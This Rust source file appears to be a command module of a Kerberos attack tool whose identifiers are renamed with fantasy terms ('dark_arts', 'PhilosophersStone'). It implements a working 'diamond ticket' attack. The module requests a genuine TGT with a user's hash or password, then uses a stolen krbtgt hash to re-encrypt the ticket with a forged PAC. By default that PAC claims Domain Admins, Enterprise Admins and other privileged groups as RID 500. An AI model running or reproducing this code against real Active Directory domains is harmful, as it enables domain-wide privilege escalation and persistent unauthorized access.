use anyhow::{bail, Result};
use std::collections::HashMap;
use crate::dungeon::display_charm::*;
use crate::dungeon::dark_arts::{forge_diamond, TicketBlueprint};
use crate::dungeon::request_magic::summon_tgt;
use crate::dungeon::wand_utils;
use crate::dungeon::potions;
use crate::dungeon::krb_structures::constants::*;

pub struct PhilosophersStone;

impl super::Spell for PhilosophersStone {
    fn incantation(&self) -> &'static str { "philosophers-stone" }
    fn grimoire(&self) -> &'static str {
        "Diamond ticket: request real TGT then inject custom PAC. \
        /user: /domain: /rc4: or /aes256: /krbtgtrc4: or /krbtgtaes256: /sid: [/id:] [/outfile:] [/dc:]"
    }
    fn cast(&self, args: &HashMap<String, String>) -> Result<()> {
        let user   = args.get("user").ok_or_else(|| anyhow::anyhow!("/user: required"))?;
        let domain = args.get("domain").ok_or_else(|| anyhow::anyhow!("/domain: required"))?;
        let sid    = args.get("sid").ok_or_else(|| anyhow::anyhow!("/sid: required (domain SID, e.g. S-1-5-21-...)"))?;
        let dc     = args.get("dc").map(|s| s.as_str());

        // Resolve user key for AS-REQ
        let (user_key, user_etype) = resolve_user_key(args, user, domain)?;

        // Resolve krbtgt key for decrypting/re-encrypting the TGT enc-part
        let (krbtgt_key, krbtgt_etype) = resolve_krbtgt_key(args)?;

        // Parse optional extra groups
        let mut groups = vec![520u32, 512, 513, 519, 518];
        if let Some(g) = args.get("groups") {
            groups = g.split(',')
                .filter_map(|s| s.trim().parse::<u32>().ok())
                .collect();
        }

        let user_id = args.get("id")
            .and_then(|s| s.parse::<u32>().ok())
            .unwrap_or(500);

        print_banner(&format!("Diamond ticket: requesting real TGT for {}@{}", user, domain));

        // Step 1: get a real TGT
        let real_tgt = summon_tgt(user, domain, &user_key, user_etype, dc)?;
        print_success(&format!("Real TGT obtained: end={}", real_tgt.end_time));

        // Step 2: forge diamond ticket
        let bp = TicketBlueprint {
            username:  user.clone(),
            domain:    domain.to_ascii_uppercase(),
            sid:       sid.clone(),
            user_id,
            groups,
            extra_sids: Vec::new(),
            flags:     TF_FORWARDABLE | TF_RENEWABLE | TF_PRE_AUTHENT,
            start_time: None,
            end_time:  None,
            service_key: krbtgt_key.clone(),
            service_etype: krbtgt_etype,
            krbtgt_key:  Some(krbtgt_key),
            krbtgt_etype: Some(krbtgt_etype),
            sname: None,
            srealm: None,
            session_key_etype: ETYPE_AES256_CTS_HMAC_SHA1_96,
        };

        let forged = forge_diamond(&real_tgt.kirbi, &bp.service_key, bp.service_etype, &bp)?;

        print_success("Diamond ticket forged successfully");
        println!();
        println!("{}", forged.b64);
        println!();

        if let Some(outfile) = args.get("outfile") {
            std::fs::write(outfile, &forged.kirbi)?;
            print_success(&format!("Written to {}", outfile));
        }
        Ok(())
    }
}

fn resolve_user_key(
    args: &HashMap<String, String>,
    user: &str,
    domain: &str,
) -> Result<(Vec<u8>, i32)> {
    if let Some(rc4) = args.get("rc4") {
        return Ok((wand_utils::hex_to_bytes(rc4)?, ETYPE_RC4_HMAC));
    }
    if let Some(aes) = args.get("aes256") {
        return Ok((wand_utils::hex_to_bytes(aes)?, ETYPE_AES256_CTS_HMAC_SHA1_96));
    }
    if let Some(pw) = args.get("password") {
        let salt = potions::kerberos_salt(user, domain);
        let key  = potions::string_to_key(ETYPE_RC4_HMAC, pw, &salt)?;
        return Ok((key, ETYPE_RC4_HMAC));
    }
    anyhow::bail!("/rc4: or /aes256: or /password: required for user authentication")
}

fn resolve_krbtgt_key(args: &HashMap<String, String>) -> Result<(Vec<u8>, i32)> {
    if let Some(rc4) = args.get("krbtgtrc4") {
        return Ok((wand_utils::hex_to_bytes(rc4)?, ETYPE_RC4_HMAC));
    }
    if let Some(aes) = args.get("krbtgtaes256") {
        return Ok((wand_utils::hex_to_bytes(aes)?, ETYPE_AES256_CTS_HMAC_SHA1_96));
    }
    anyhow::bail!("/krbtgtrc4: or /krbtgtaes256: required (krbtgt account hash)")
}
